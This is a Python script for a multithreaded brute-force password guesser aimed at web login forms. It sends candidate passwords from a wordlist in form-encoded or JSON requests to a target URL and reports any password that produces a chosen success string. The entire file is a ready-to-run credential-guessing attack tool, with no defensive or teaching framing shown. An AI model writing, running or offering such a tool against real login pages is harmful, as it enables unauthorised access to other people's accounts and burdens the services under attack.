import argparse
import threading
import queue
import requests
import json

parser = argparse.ArgumentParser(description=" Fast Password Guesser for HTML/JSON forms")
parser.add_argument('-u', '--url', help='Target form action URL', required=True)
parser.add_argument('-d', '--data', help='Request data. Use FUZZ as the password placeholder.', required=True)
parser.add_argument('-m', '--method', help='Request method: GET or POST', required=True)
parser.add_argument('-s', '--success_message', help="Text to identify successful login (e.g., token)", required=True)
parser.add_argument('-t', '--threads', help="Number of threads to use", required=True)

args = parser.parse_args()

url = args.url
data_template = args.data
method = args.method.upper()
success_message = args.success_message.lower()
threads = int(args.threads)

# Detect if data is JSON
is_json = False
try:
    json.loads(data_template.replace("FUZZ", "test"))
    is_json = True
except:
    pass

# Setup session
session = requests.Session()
session.headers['User-Agent'] = "Mozilla/5.0 (BruteForceBot)"
if is_json:
    session.headers['Content-Type'] = 'application/json'
else:
    session.headers['Content-Type'] = 'application/x-www-form-urlencoded'

# Connectivity check
try:
    test_conn = session.get(url, timeout=5)
except Exception as e:
    print(f"[x] Can't connect to {url}: {e}")
    exit()

guessed = False
correct_password = ''
q = queue.Queue()

# Load passwords into queue
with open('password.txt', 'r') as file:
    for password in file.read().splitlines():
        q.put(password)

# Brute-force logic
def http_guesser():
    global guessed, correct_password
    while not guessed and not q.empty():
        current_pass = q.get()
        try:
            print(f"[+] Trying: {current_pass}")
            if is_json:
                payload = json.loads(data_template.replace("FUZZ", current_pass))
                res = session.request(method, url, timeout=5, json=payload, allow_redirects=True)
            else:
                payload = data_template.replace("FUZZ", current_pass)
                res = session.request(method, url, timeout=5, data=payload, allow_redirects=True)

            if success_message in res.text.lower():
                print(f"[:)] Success! Password: {current_pass}")
                guessed = True
                correct_password = current_pass
        except Exception as e:
            print(f"[x] Error: {e}")
        q.task_done()

# Start threads
thread_list = []
for _ in range(threads):
    t = threading.Thread(target=http_guesser, daemon=True)
    t.start()
    thread_list.append(t)

# Wait for completion
for th in thread_list:
    th.join()

# Result
if guessed:
    print(f"[✔️] Cracked! Correct password: {correct_password}")
else:
    print("[❌] Password not found.")
